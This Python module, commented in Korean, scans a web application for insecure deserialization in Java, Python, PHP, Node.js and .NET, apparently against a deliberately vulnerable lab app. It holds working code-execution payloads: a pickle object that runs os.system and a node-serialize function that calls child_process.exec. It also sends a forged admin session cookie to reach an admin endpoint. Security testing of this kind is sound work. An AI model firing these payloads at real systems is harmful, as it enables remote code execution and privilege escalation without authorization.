"""
Insecure Deserialization (역직렬화 취약점)
Java, Python, PHP 역직렬화 공격 탐지
"""
import requests
import base64
import pickle
import io

def scan(target_url):
    result = {
        'name': 'Insecure Deserialization (역직렬화)',
        'category': 'Code Execution',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': '신뢰할 수 없는 데이터 역직렬화 금지, JSON 사용, 화이트리스트 기반 검증',
        'details': ''
    }
    
    details = []
    
    # 1. Java 역직렬화 테스트
    details.append("[역직렬화-1] Java 역직렬화 테스트")
    
    try:
        # Java 직렬화 매직 바이트: AC ED 00 05
        java_magic = b'\xac\xed\x00\x05'
        
        # 간단한 Java 직렬화 객체
        java_payload = java_magic + b'\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70'
        java_b64 = base64.b64encode(java_payload).decode()
        
        # 쿠키에 전송
        cookies = {
            'session': java_b64,
            'JSESSIONID': java_b64,
            'user_data': java_b64
        }
        
        headers = {'X-Security-Mode': 'vulnerable'}
        resp = requests.get(f"{target_url}/api/employees/me", 
                           cookies=cookies, headers=headers, timeout=5)
        
        # 역직렬화 관련 에러 확인
        error_keywords = [
            'java.io.ObjectInputStream',
            'readObject',
            'ClassNotFoundException',
            'InvalidClassException',
            'StreamCorruptedException',
            'deserialization',
            'deserialize'
        ]
        
        if any(keyword in resp.text for keyword in error_keywords):
            result['vulnerabilities'].append("Java 역직렬화 처리 감지")
            details.append("  ✗ Java 직렬화 데이터 처리 중")
            result['status'] = 'VULNERABLE'
        elif resp.status_code == 500:
            result['vulnerabilities'].append("역직렬화 처리 오류 (500)")
            details.append("  ⚠ 500 에러 발생")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ Java 역직렬화 취약점 없음")
            
    except Exception as e:
        details.append(f"  • Java 테스트 실패: {str(e)[:50]}")
    
    # 2. Python Pickle 역직렬화
    details.append("\n[역직렬화-2] Python Pickle 테스트")
    
    try:
        # 악의적인 Pickle 객체 생성
        class MaliciousPickle:
            def __reduce__(self):
                import os
                return (os.system, ('echo vulnerable',))
        
        malicious_obj = MaliciousPickle()
        pickled = pickle.dumps(malicious_obj)
        pickle_b64 = base64.b64encode(pickled).decode()
        
        # POST로 전송
        data = {
            'data': pickle_b64,
            'serialized_data': pickle_b64
        }
        
        headers = {
            'X-Security-Mode': 'vulnerable',
            'Content-Type': 'application/json'
        }
        
        resp = requests.post(f"{target_url}/api/import", 
                            json=data, headers=headers, timeout=5)
        
        pickle_keywords = ['pickle', 'unpickle', '__reduce__', 'cPickle']
        
        if any(keyword in resp.text.lower() for keyword in pickle_keywords):
            result['vulnerabilities'].append("Python Pickle 역직렬화 가능성")
            details.append("  ⚠ Pickle 처리 감지")
            result['status'] = 'VULNERABLE'
        elif resp.status_code == 500:
            details.append("  ⚠ 500 에러 (Pickle 가능성)")
        else:
            details.append("  ✓ Pickle 취약점 없음")
            
    except Exception as e:
        details.append(f"  • Pickle 테스트 실패")
    
    # 3. PHP 역직렬화
    details.append("\n[역직렬화-3] PHP 역직렬화 테스트")
    
    try:
        # PHP 직렬화 형식
        php_payloads = [
            'O:8:"stdClass":0:{}',  # 빈 객체
            'a:1:{s:4:"test";s:5:"value";}',  # 배열
            'O:4:"User":1:{s:4:"name";s:5:"admin";}',  # User 객체
        ]
        
        for payload in php_payloads:
            # 쿠키에 전송
            cookies = {
                'PHPSESSID': base64.b64encode(payload.encode()).decode(),
                'user_session': payload
            }
            
            resp = requests.get(target_url, cookies=cookies, timeout=5)
            
            php_keywords = ['unserialize', '__wakeup', '__destruct', '__sleep']
            
            if any(keyword in resp.text.lower() for keyword in php_keywords):
                result['vulnerabilities'].append("PHP 역직렬화 가능성")
                details.append("  ⚠ PHP unserialize 감지")
                result['status'] = 'VULNERABLE'
                break
        
        if result['status'] == 'SAFE':
            details.append("  ✓ PHP 역직렬화 취약점 없음")
            
    except Exception as e:
        details.append("  • PHP 테스트 실패")
    
    # 4. Node.js node-serialize 취약점
    details.append("\n[역직렬화-4] Node.js 역직렬화")
    
    try:
        # node-serialize 취약점 페이로드
        nodejs_payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
        
        cookies = {
            'session': base64.b64encode(nodejs_payload.encode()).decode()
        }
        
        headers = {'X-Security-Mode': 'vulnerable'}
        resp = requests.get(target_url, cookies=cookies, headers=headers, timeout=5)
        
        if 'ND_FUNC' in resp.text or 'node-serialize' in resp.text:
            result['vulnerabilities'].append("Node.js 역직렬화 취약점")
            details.append("  ✗ node-serialize 취약")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ Node.js 역직렬화 안전")
            
    except:
        details.append("  • Node.js 테스트 불가")
    
    # 5. 세션 데이터 조작
    details.append("\n[역직렬화-5] 세션 조작 테스트")
    
    try:
        # Base64 인코딩된 JSON (서명 없음)
        session_data = {
            "user_id": 1,
            "is_admin": True,
            "role": "ADMIN"
        }
        
        import json
        session_json = json.dumps(session_data)
        session_b64 = base64.b64encode(session_json.encode()).decode()
        
        cookies = {'session': session_b64}
        headers = {'X-Security-Mode': 'vulnerable'}
        
        # 관리자 페이지 접근 시도
        resp = requests.get(f"{target_url}/api/admin/users", 
                           cookies=cookies, headers=headers, timeout=5)
        
        if resp.status_code == 200:
            result['vulnerabilities'].append("세션 데이터 무결성 검증 부재")
            details.append("  ✗ 세션 조작으로 권한 상승 성공")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ 세션 무결성 검증 존재")
            
    except:
        details.append("  • 세션 조작 테스트 불가")
    
    # 6. .NET BinaryFormatter
    details.append("\n[역직렬화-6] .NET 역직렬화")
    
    try:
        # .NET BinaryFormatter 헤더
        dotnet_magic = b'\x00\x01\x00\x00\x00\xff\xff\xff\xff'
        dotnet_b64 = base64.b64encode(dotnet_magic).decode()
        
        cookies = {'ASP.NET_SessionId': dotnet_b64}
        resp = requests.get(target_url, cookies=cookies, timeout=5)
        
        if 'BinaryFormatter' in resp.text or 'System.Runtime.Serialization' in resp.text:
            result['vulnerabilities'].append(".NET BinaryFormatter 사용")
            details.append("  ⚠ .NET 역직렬화 감지")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ .NET 역직렬화 안전")
            
    except:
        details.append("  • .NET 테스트 불가")
    
    result['details'] = '\n'.join(details)
    return result